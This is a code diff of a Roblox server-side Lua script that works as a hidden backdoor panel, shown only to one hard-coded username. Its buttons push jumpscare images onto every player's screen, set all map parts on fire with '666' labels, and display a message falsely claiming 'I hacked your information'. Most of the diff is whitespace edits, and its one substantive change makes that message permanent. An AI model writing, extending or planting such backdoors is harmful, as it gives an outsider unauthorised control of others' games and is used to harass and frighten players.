@@ -14,7 +14,7 @@ local function CreateServerSideUI(player)
     if player.Name ~= TARGET_USERNAME then
         return
     end
-    
+
     -- 创建主UI
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Name = "黑迪客后门🤫"
@@ -80,12 +80,12 @@ local function CreateServerSideUI(player)
         Button.TextSize = 12
         Button.Font = Enum.Font.Gotham
         Button.Parent = ButtonContainer
-        
+
         -- 服务器端处理点击事件
         Button.MouseButton1Click:Connect(function()
             callback()
         end)
-        
+
         return Button
     end
 
@@ -105,7 +105,7 @@ local function CreateServerSideUI(player)
                     billboardGui.AlwaysOnTop = true
                     billboardGui.MaxDistance = 500
                     billboardGui.Parent = head
-                    
+
                     local imageLabel = Instance.new("ImageLabel")
                     imageLabel.Size = UDim2.new(1, 0, 1, 0)
                     imageLabel.BackgroundTransparency = 1
@@ -132,7 +132,7 @@ local function CreateServerSideUI(player)
                     billboardGui.AlwaysOnTop = true
                     billboardGui.MaxDistance = 500
                     billboardGui.Parent = head
-                    
+
                     local imageLabel = Instance.new("ImageLabel")
                     imageLabel.Size = UDim2.new(1, 0, 1, 0)
                     imageLabel.BackgroundTransparency = 1
@@ -250,19 +250,19 @@ local function CreateServerSideUI(player)
             if targetPlayer:FindFirstChild("PlayerGui") then
                 local ScreenGui = Instance.new("ScreenGui")
                 local ImageLabel = Instance.new("ImageLabel")
-                
+
                 ScreenGui.Parent = targetPlayer.PlayerGui
                 ScreenGui.IgnoreGuiInset = true
                 ScreenGui.Name = "JumpScare"
                 ScreenGui.ResetOnSpawn = false
-                
+
                 ImageLabel.Parent = ScreenGui
                 ImageLabel.Size = UDim2.new(1, 0, 1, 0)
                 ImageLabel.Image = "http://www.roblox.com/asset/?id=71608509918657"
                 ImageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
                 ImageLabel.BackgroundTransparency = 0
                 ImageLabel.ScaleType = Enum.ScaleType.Fit
-                
+
                 spawn(function()
                     wait(5)
                     ScreenGui:Destroy()
@@ -284,13 +284,13 @@ local function CreateServerSideUI(player)
             while true do
                 counter = counter + 0.01
                 if counter > 1 then counter = 0 end
-                
+
                 local hue = counter
                 local color = Color3.fromHSV(hue, 1, 1)
-                
+
                 colorCorrection.TintColor = color
                 Lighting.Ambient = Color3.fromHSV(hue, 0.3, 0.8)
-                
+
                 wait(0.1)
             end
         end)
@@ -307,33 +307,33 @@ local function CreateServerSideUI(player)
                     child.BrickColor = BrickColor.new("Really black")
                     child.TopSurface = Enum.SurfaceType.Smooth
                     child.BottomSurface = Enum.SurfaceType.Smooth
-                    
+
                     -- 添加红色选择框
                     local selectionBox = Instance.new("SelectionBox")
                     selectionBox.Adornee = child
                     selectionBox.Color = BrickColor.new("Really red")
                     selectionBox.Parent = child
-                    
+
                     -- 添加红色点光源
                     local pointLight = Instance.new("PointLight")
                     pointLight.Color = Color3.new(1, 0, 0)
                     pointLight.Range = 15
                     pointLight.Brightness = 5
                     pointLight.Parent = child
-                    
+
                     -- 添加火焰效果
                     local fire = Instance.new("Fire")
                     fire.Size = 19
                     fire.Heat = 22
                     fire.Parent = child
-                    
+
                     -- 创建BillboardGui和TextLabel
                     local billboard = Instance.new("BillboardGui")
                     billboard.Name = "stuf"
                     billboard.Adornee = child
                     billboard.Size = UDim2.new(2.5, 0, 2.5, 0)
                     billboard.Parent = child
-                    
+
                     local textLabel = Instance.new("TextLabel")
                     textLabel.Text = "666 666 666 666 666 666"
                     textLabel.Font = Enum.Font.SourceSansBold
@@ -344,17 +344,17 @@ local function CreateServerSideUI(player)
                     textLabel.BackgroundTransparency = 1
                     textLabel.Parent = billboard
                 end
-                
+
                 -- 递归处理子对象
                 if #child:GetChildren() > 0 then
                     Apply666Effects(child)
                 end
             end
         end
-        
+
         -- 对整个工作空间应用效果
         Apply666Effects(game.Workspace)
-        
+
         -- 对工作空间的直接子对象也应用效果
         for _, obj in pairs(workspace:GetChildren()) do
             if obj:IsA("BasePart") then
@@ -363,7 +363,7 @@ local function CreateServerSideUI(player)
                 billboard.Adornee = obj
                 billboard.Size = UDim2.new(2.5, 0, 2.5, 0)
                 billboard.Parent = obj
-                
+
                 local textLabel = Instance.new("TextLabel")
                 textLabel.Text = "666 666 666 666 666 666"
                 textLabel.Font = Enum.Font.SourceSansBold
@@ -379,15 +379,13 @@ local function CreateServerSideUI(player)
 
     buttonY = buttonY + 40
 
-    -- 显示提示文字
-    CreateButton("显示提示", UDim2.new(0, 5, 0, buttonY), function()
-        local hint = Instance.new("Hint", game.Workspace)
-        hint.Text = "我破解了你的信息 你现在在玩Roblox"
-        
-        spawn(function()
-            wait(10)
-            hint:Destroy()
-        end)
+    -- 永久显示提示文字
+    CreateButton("显示永久提示", UDim2.new(0, 5, 0, buttonY), function()
+        -- 创建永久提示
+        local permanentHint = Instance.new("Message", game.Workspace)
+        permanentHint.Name = "PermanentHint"
+        permanentHint.Text = "我破解了你的信息 你现在在玩Roblox"
+        -- 这个提示将永久显示，直到手动清除
     end)
 
     buttonY = buttonY + 40
@@ -398,7 +396,7 @@ local function CreateServerSideUI(player)
         if Lighting:FindFirstChild("Sky") then
             Lighting.Sky:Destroy()
         end
-        
+
         -- 清除声音
         for _, sound in pairs(game.Workspace:GetChildren()) do
             if sound:IsA("Sound") then
@@ -406,42 +404,42 @@ local function CreateServerSideUI(player)
                 sound:Destroy()
             end
         end
-        
+
         -- 清除粒子效果
         for _, obj in pairs(workspace:GetDescendants()) do
             if obj:IsA("ParticleEmitter") then
                 obj:Destroy()
             end
         end
-        
+
         -- 清除BillboardGui
         for _, obj in pairs(workspace:GetDescendants()) do
             if obj:IsA("BillboardGui") then
                 obj:Destroy()
             end
         end
-        
+
         -- 清除选择框
         for _, obj in pairs(workspace:GetDescendants()) do
             if obj:IsA("SelectionBox") then
                 obj:Destroy()
             end
         end
-        
+
         -- 清除点光源
         for _, obj in pairs(workspace:GetDescendants()) do
             if obj:IsA("PointLight") then
                 obj:Destroy()
             end
         end
-        
+
         -- 清除火焰效果
         for _, obj in pairs(workspace:GetDescendants()) do
             if obj:IsA("Fire") then
                 obj:Destroy()
             end
         end
-        
+
         -- 清除屏幕GUI
         for _, targetPlayer in pairs(Players:GetPlayers()) do
             if targetPlayer:FindFirstChild("PlayerGui") then
@@ -452,31 +450,31 @@ local function CreateServerSideUI(player)
                 end
             end
         end
-        
-        -- 清除提示
+
+        -- 清除提示（包括永久提示）
         for _, hint in pairs(game.Workspace:GetChildren()) do
-            if hint:IsA("Hint") then
+            if hint:IsA("Hint") or hint:IsA("Message") then
                 hint:Destroy()
             end
         end
-        
+
         -- 清除贴图
         for _, obj in pairs(workspace:GetDescendants()) do
             if obj:IsA("Decal") then
                 obj:Destroy()
             end
         end
-        
+
         -- 恢复光照设置
         Lighting.Ambient = Color3.new(0.5, 0.5, 0.5)
-        
+
         -- 清除颜色校正效果
         for _, effect in pairs(Lighting:GetChildren()) do
             if effect:IsA("ColorCorrectionEffect") then
                 effect:Destroy()
             end
         end
-        
+
         -- 恢复部件颜色
         for _, obj in pairs(workspace:GetDescendants()) do
             if obj:IsA("BasePart") then
